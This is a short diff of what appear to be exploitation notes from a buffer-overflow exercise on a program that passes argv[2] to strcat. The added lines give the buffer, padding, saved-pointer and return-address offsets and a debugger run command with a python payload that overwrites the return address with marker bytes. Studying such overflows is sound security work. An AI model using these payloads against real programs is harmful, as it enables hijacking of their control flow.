@@ -5,4 +5,11 @@ buffer overflow at 101 (strcat(log, argv[2])
 main return address: 0x17f3
 strcat call address: 0x527e
 
->= 300 bytes so far overwrites return add. 
+247 to overwrite buffer
+43 extra padding
+8 saved pointer
+8 return address
+
+r ci $(python -c 'print("A"*247+"A"*43+"B"*8+"C"*8)')
+
+ra = 0x4242...42
